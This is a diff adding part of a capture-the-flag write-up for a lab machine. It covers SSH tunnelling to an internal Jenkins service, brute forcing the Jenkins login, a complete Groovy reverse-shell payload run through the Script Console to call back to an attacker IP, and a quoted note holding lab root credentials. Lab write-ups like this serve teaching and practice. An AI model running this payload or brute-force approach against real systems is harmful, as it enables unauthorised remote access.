@@ -137,3 +137,35 @@ Internal Jenkins service is running on 172.17.0.2:8080
 Let's check if it is still running with netstat.
 `tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     `
 and yes, it is running.
+
+We will have to do ssh tunelling so we can access the internal service that can be only visited through localhost.
+We can do that with following command:
+```
+ssh -L 9090:127.0.0.1:8080 aubreanna@internal.thm
+```
+This would be able to run jenkins service on our 9090 port which we can access through 127.0.0.1:9090
+As we have access to it, we should try default credentials on the login page.
+[jenkins:jenkins, admin:password and etc] did not work so we will have to move to brute forcing.
+It is known that default username for jenkins is either `jenkins` or `admin` (which we already met in wordpress) so we will try admin one first.
+Using burp suite we will brute force login page and we will use top 10 million passwords wordlist as payload with it.
+
+After some time, correct password was found and it was `spongebob`
+Now we will log in with following credentials: `admin:spongebob`
+After snooping around and checking function by function I have found the `Script Console` which can run arbitary groovy scripts inside of `Manage Jenkins` tab in side menu on left side. So I was almost sure that root was running jenkins or someone with enough privileges to have root acces so I thought reverse shell would be answer.
+Using following payload I got reverse shell:
+```
+String host="10.8.22.53"; 
+int port=1234;
+ String cmd="bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+And whalla! We got the Jenkins user about which I was partly right. First place I checked was /opt directory and I was right. It changed. Notice we got `notes.txt` file which contains everything we need:
+```
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+```
+
+## Final show
